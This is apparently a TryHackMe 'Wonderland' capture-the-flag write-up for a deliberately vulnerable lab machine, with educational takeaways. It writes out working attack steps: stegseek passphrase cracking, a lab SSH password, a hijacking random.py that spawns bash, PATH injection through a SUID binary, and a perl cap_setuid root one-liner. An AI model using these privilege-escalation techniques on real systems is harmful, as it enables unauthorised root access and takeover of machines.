# 🛡️ TryHackMe – Wonderland - Writeup

## 📌 Overview
**Room Name:** Wonderland  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Steganography / Python Library Hijacking / Privilege Escalation

Wonderland is a multi-stage room themed around "Alice in Wonderland". It requires steganography, directory brute-forcing, and a chained privilege escalation journey — moving from Alice to Rabbit, then Hatter, and finally Root — by exploiting relative path vulnerabilities and Linux Capabilities.

The attack chain involves:

- stegseek to extract a hint from a JPEG image
- Directory traversal to `/r/a/b/b/i/t/` revealing SSH credentials
- Python library hijacking (`random.py`) for lateral movement to `rabbit`
- PATH Injection via a SUID binary (`teaParty`) for lateral movement to `hatter`
- Linux Capabilities (`cap_setuid` on `perl`) for root access

---

## 🔍 1. Enumeration

### 🔎 Port Scanning

```bash
nmap -sC -sV <target_ip>
```

```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

### 🖼️ Steganography & Initial Hints
The web service displayed an image. Downloaded `whiterabbit.jpeg` and cracked its steghide passphrase with `stegseek`:

```bash
stegseek -sf whiterabbit.jpeg /usr/share/wordlists/rockyou.txt
```

Extracted `hint.txt` containing: `follow the r a b b i t`

### 🌐 Directory Brute-forcing
Taking the hint literally, manually traversed the path `/r/a/b/b/i/t/`. The final page's HTML source revealed Alice's SSH credentials:

- **Username:** `alice`
- **Password:** `HowDothTheLittleCrocodileImproveHisShiningTail`

---

## 🔓 2. Initial Access

```bash
ssh alice@<TARGET_IP>
```

**Initial access as `alice` achieved.** ✅

---

## 🚀 3. Lateral Movement: alice → rabbit

### 🐍 Python Library Hijacking
`sudo -l` showed Alice could run a Python script as `rabbit`:

```text
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script performed `import random`. Python searches the current working directory before standard libraries. Since the script is in Alice's home directory (where she has write access), hijacking the import was straightforward:

```python
# /home/alice/random.py
import os
os.system("/bin/bash")
```

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Python loaded `/home/alice/random.py` instead of the standard library module.

**Lateral movement to `rabbit` achieved.** ✅

---

## 🚀 4. Lateral Movement: rabbit → hatter

### 🛠️ PATH Injection via SUID Binary
In Rabbit's home directory, found an SUID binary `teaParty`. Analyzed with `strings`:

```text
date --date='next hour' -R
```

The binary calls `date` using a **relative path** — vulnerable to PATH Injection.

```bash
# Create a fake 'date' in /tmp
echo "/bin/bash" > /tmp/date
chmod +x /tmp/date

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
./teaParty
```

Found `password.txt` in Hatter's directory and established a stable SSH session as `hatter`.

**Lateral movement to `hatter` achieved.** ✅

---

## 👑 5. Privilege Escalation: hatter → root

### ⚡ Linux Capabilities — cap_setuid on perl
No sudo rights and no interesting SUID files. Enumerated Linux Capabilities:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/perl = cap_setuid+ep
```

`cap_setuid` allows `perl` to set its own UID to 0 (root). Exploited with a one-liner from GTFOBins:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

> True to the "Alice in Wonderland" theme, flags were placed **upside down**:

- **User Flag:** Located in `/root/user.txt`
- **Root Flag:** Located in `/home/alice/root.txt`

---

## 📚 Key Takeaways

- 🐍 **Python relative imports are a hijacking vector:** Scripts that `import` standard modules run from a user-writable directory can be intercepted by placing a malicious module with the same name.
- 🛠️ **Relative paths in SUID binaries enable PATH Injection:** Whether it's Python imports or shell commands, relative paths give attackers control over what actually executes.
- ⚡ **Linux Capabilities are a hidden PrivEsc vector:** When `sudo` and SUID fail, always check `getcap`. `cap_setuid` on an interpreter like `perl` is effectively equivalent to root.
- 🔍 **Contextual clues matter:** The room's "follow the rabbit" theme was essential for navigating the directory structure — always read all provided hints carefully.

---

## 🛠️ Tools Used

- `nmap`
- `stegseek`
- `gobuster`
- `ssh`
- `strings`
- `getcap`
- `perl`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
